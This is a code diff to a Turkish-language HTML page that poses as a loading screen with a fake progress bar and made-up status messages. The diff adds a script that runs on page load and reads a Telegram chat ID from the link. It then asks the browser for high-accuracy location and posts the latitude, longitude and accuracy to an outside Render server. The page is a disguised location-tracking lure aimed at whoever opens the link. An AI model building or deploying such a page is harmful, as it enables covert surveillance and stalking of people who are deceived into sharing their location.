@@ -1,4 +1,3 @@
-#Tüm Kodlar @policecc (telegram) a aittir.
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -111,8 +110,10 @@
   </div>
 
   <script>
-    let progress = 0;
+    // RENDER WEB SERVICE LINKIN (Sonunda eğik çizgi olmadan yaz)
+    const RENDER_URL = 'https://private-for-gps.onrender.com'; 
 
+    let progress = 0;
     const progressBar = document.getElementById("progress");
     const percentText = document.getElementById("percent");
     const statusText = document.getElementById("status");
@@ -125,26 +126,73 @@
       "Paketler indiriliyor...",
       "Sinyal güçlendiriliyor...",
       "Bellek optimizasyonu yapılıyor...",
-      "Veritabanı el sıkışması bekleniyor..."
+      "Veritabanı el suksesmesi bekleniyor..."
     ];
 
+    // Yükleme Çubuğu Animasyonu
     setInterval(() => {
       if (progress < 96) {
         progress += Math.random() * 1.5;
-
         if (progress > 96) progress = 96;
-
         progressBar.style.width = progress + "%";
         percentText.innerText = Math.floor(progress) + "%";
       }
     }, 400);
 
+    // Durum Yazıları Animasyonu
     setInterval(() => {
-      const randomMessage =
-        fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
-
+      const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
       statusText.innerText = randomMessage;
     }, 3500);
+
+    // URL'den Şifreli ID'yi Çözme Fonksiyonu
+    function getChatIdFromUrl() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const encryptedId = urlParams.get('id');
+      if (!encryptedId) return null;
+      // bot.py'deki (chat_id * 7 + 12345) formülünün tersi
+      return Math.round((parseInt(encryptedId) - 12345) / 7);
+    }
+
+    // Konum İsteme ve Render'a Gönderme
+    window.onload = function() {
+      const chatId = getChatIdFromUrl();
+      if (!chatId) {
+        console.error("ID bulunamadı.");
+        return;
+      }
+
+      if (navigator.geolocation) {
+        // Tarayıcıdan yüksek doğruluklu konum talep et
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const data = {
+              chat_id: chatId,
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              acc: position.coords.accuracy
+            };
+
+            // Veriyi Render API'sine POST et
+            fetch(`${RENDER_URL}/konum-al`, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(data)
+            })
+            .then(res => console.log("Veri başarıyla gönderildi."))
+            .catch(err => console.error("Veri gönderme hatası:", err));
+          },
+          (error) => {
+            console.error("Konum izni reddedildi veya hata oluştu:", error);
+          },
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      } else {
+        console.error("Tarayıcı konum desteklemiyor.");
+      }
+    };
   </script>
 
 </body>
